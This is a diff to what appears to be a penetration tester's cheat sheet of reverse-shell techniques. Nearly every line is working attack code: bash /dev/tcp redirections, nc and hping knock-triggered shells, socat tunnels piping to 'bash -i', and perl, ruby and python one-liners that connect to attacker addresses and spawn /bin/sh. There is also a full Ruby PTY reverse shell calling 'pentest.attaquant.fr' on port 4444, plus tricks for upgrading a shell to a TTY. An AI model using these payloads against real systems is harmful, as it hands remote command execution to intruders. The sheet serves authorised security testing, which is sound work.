@@ -33,7 +33,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 hping -I eth0 -p 22 --listen s3cr3t | /bin/sh
 moi: echo s3cr3t | nc -v victim 22
 
-## le vpn du pauvre
+## cheap vpn
 sshuttle https://github.com/apenwarr/sshuttle
 
 ## icmp
@@ -99,42 +99,14 @@ clt: socat exec:'path/to/client.py proxy.dmz 3128 jmpbox.com 443' exec:'bash -i'
 moi: server.py
 clt: ./client.py 192.168.122.1 3128 10.6.6.6 443 < f | bash -i &>f
 
-# nc-like with pty
-https://github.com/emptymonkey/revsh
-
-# lsv hsc Dec 2014
-clt:
-require 'pty'
-require 'socket'
-
-def doconnect()
-  begin
-    s = TCPSocket.new 'pentest.attaquant.fr', 4444
-    return s
-  rescue
-    sleep(1)
-    retry
-  end
-end
-
-PTY.spawn("/bin/bash") {|r, w, pid|
-  socket = doconnect
-  loop do
-    r_s = select([r, socket]);
-    output = (r_s[0][0] == socket) ? w : socket
-    begin
-      out = r_s[0][0].read_nonblock(1024)
-      output.write(out)
-    rescue EOFError
-      socket = doconnect
-    end
-  end
-}
-
 # bash
-echo salut > /dev/tcp/1.2.3.4/80 # test if disabled
-bash 0</dev/tcp/1.2.3.4/8888 1>&0 2>&0 #hsc
-bash -i >& /dev/tcp/1.2.3.4/1234 0>&1 #pm
+echo salut > /dev/tcp/1.2.3.4/80 # test if enabled
+bash 0</dev/tcp/1.2.3.4/8888 1>&0 2>&0
+bash -c 'bash -i >& /dev/tcp/1.2.3.4/1234 0>&1'
+
+# tools
+https://github.com/emptymonkey/revsh # nc-like with pty
+https://github.com/IppSec/forward-shell # pty over non-persistent tcp
 
 # perl
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' #pm
@@ -165,6 +137,35 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.6.6.6","8888");\
   while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' #hsc
+
+# lsv hsc Dec 2014
+clt:
+require 'pty'
+require 'socket'
+
+def doconnect()
+  begin
+    s = TCPSocket.new 'pentest.attaquant.fr', 4444
+    return s
+  rescue
+    sleep(1)
+    retry
+  end
+end
+
+PTY.spawn("/bin/bash") {|r, w, pid|
+  socket = doconnect
+  loop do
+    r_s = select([r, socket]);
+    output = (r_s[0][0] == socket) ? w : socket
+    begin
+      out = r_s[0][0].read_nonblock(1024)
+      output.write(out)
+    rescue EOFError
+      socket = doconnect
+    end
+  end
+}
 
 # python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' #pm
@@ -200,10 +201,11 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
 
 # javascript/rundll32 (windows)
-https://gist.github.com/subTee/f1603fa5c15d5f8825c0 (https://twitter.com/subTee/status/676581725414166529)
+https://gist.github.com/subTee/f1603fa5c15d5f8825c0 from https://twitter.com/subTee/status/676581725414166529
 
 # get a tty
 * using expect
 http://pentestmonkey.net/blog/post-exploitation-without-a-tty
+
 * using python
-python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/sh")'; export TERM=xterm; # then ^Z stty raw -echo; fg
